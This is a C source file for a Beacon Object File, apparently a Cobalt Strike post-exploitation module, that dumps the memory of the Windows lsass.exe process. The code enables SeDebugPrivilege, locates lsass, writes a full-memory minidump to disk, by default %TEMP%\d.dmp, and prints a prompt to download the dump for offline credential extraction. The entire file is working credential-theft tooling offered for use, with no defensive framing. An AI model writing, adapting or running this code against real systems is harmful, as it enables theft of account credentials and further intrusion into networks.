/*
 * lsass_minidump.c - MiniDump lsass.exe process memory
 *
 * Requires: Administrator privileges + SeDebugPrivilege
 * Args:     output_path (string, optional - defaults to %TEMP%\d.dmp)
 */

#include <windows.h>
#include <tlhelp32.h>
#define BOF
#include "beacon.h"

/* MiniDumpWriteDump typedef */
typedef BOOL (WINAPI *pMiniDumpWriteDump)(
    HANDLE hProcess,
    DWORD  ProcessId,
    HANDLE hFile,
    DWORD  DumpType,
    PVOID  ExceptionParam,
    PVOID  UserStreamParam,
    PVOID  CallbackParam
);

#define MiniDumpWithFullMemory 0x00000002

/* DFR imports */
DFR(KERNEL32, GetEnvironmentVariableA)
DFR(KERNEL32, CreateToolhelp32Snapshot)
DFR(KERNEL32, Process32First)
DFR(KERNEL32, Process32Next)
DFR(KERNEL32, OpenProcess)
DFR(KERNEL32, CreateFileA)
DFR(KERNEL32, CloseHandle)
DFR(KERNEL32, LoadLibraryA)
DFR(KERNEL32, GetProcAddress)
DFR(KERNEL32, GetCurrentProcess)
DFR(KERNEL32, GetLastError)
DFR(ADVAPI32, OpenProcessToken)
DFR(ADVAPI32, LookupPrivilegeValueA)
DFR(ADVAPI32, AdjustTokenPrivileges)

void go(char* args, int len) {
    datap parser;
    int   out_size = 0;
    char* out_path = NULL;
    char  dump_path[MAX_PATH];
    DWORD lsass_pid = 0;

    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32 pe;
    HANDLE hLsass = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HMODULE hDbgHelp = NULL;
    pMiniDumpWriteDump fnMiniDump = NULL;

    BeaconDataParse(&parser, args, len);
    out_path = BeaconDataExtract(&parser, &out_size);

    /* Build output path */
    if (out_path == NULL || out_size <= 1) {
        char temp[MAX_PATH];
        KERNEL32$GetEnvironmentVariableA("TEMP", temp, MAX_PATH);
        wsprintfA(dump_path, "%s\\d.dmp", temp);
    } else {
        wsprintfA(dump_path, "%s", out_path);
    }

    /* Enable SeDebugPrivilege */
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed: %lu",
                     KERNEL32$GetLastError());
        return;
    }

    if (!ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue failed: %lu",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    if (KERNEL32$GetLastError() != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges failed: %lu",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return;
    }
    KERNEL32$CloseHandle(hToken);
    hToken = NULL;

    /* Find lsass.exe PID */
    hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed: %lu",
                     KERNEL32$GetLastError());
        return;
    }

    pe.dwSize = sizeof(PROCESSENTRY32);
    if (KERNEL32$Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                lsass_pid = pe.th32ProcessID;
                break;
            }
        } while (KERNEL32$Process32Next(hSnapshot, &pe));
    }
    KERNEL32$CloseHandle(hSnapshot);

    if (lsass_pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Could not find lsass.exe process.");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Found lsass.exe PID: %lu", lsass_pid);

    /* Open lsass process */
    hLsass = KERNEL32$OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsass_pid);
    if (hLsass == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess failed: %lu",
                     KERNEL32$GetLastError());
        return;
    }

    /* Load dbghelp.dll and resolve MiniDumpWriteDump */
    hDbgHelp = KERNEL32$LoadLibraryA("dbghelp.dll");
    if (hDbgHelp == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "LoadLibrary(dbghelp.dll) failed: %lu",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hLsass);
        return;
    }

    fnMiniDump = (pMiniDumpWriteDump)KERNEL32$GetProcAddress(
        hDbgHelp, "MiniDumpWriteDump");
    if (fnMiniDump == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "GetProcAddress(MiniDumpWriteDump) failed: %lu",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hLsass);
        return;
    }

    /* Create output file */
    hFile = KERNEL32$CreateFileA(dump_path, GENERIC_WRITE, 0, NULL,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFile failed: %lu",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hLsass);
        return;
    }

    /* Perform minidump */
    if (!fnMiniDump(hLsass, lsass_pid, hFile, MiniDumpWithFullMemory,
                    NULL, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "MiniDumpWriteDump failed: %lu",
                     KERNEL32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS dump written to: %s", dump_path);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Download file for offline extraction.");
    }

    /* Cleanup */
    KERNEL32$CloseHandle(hFile);
    KERNEL32$CloseHandle(hLsass);
}
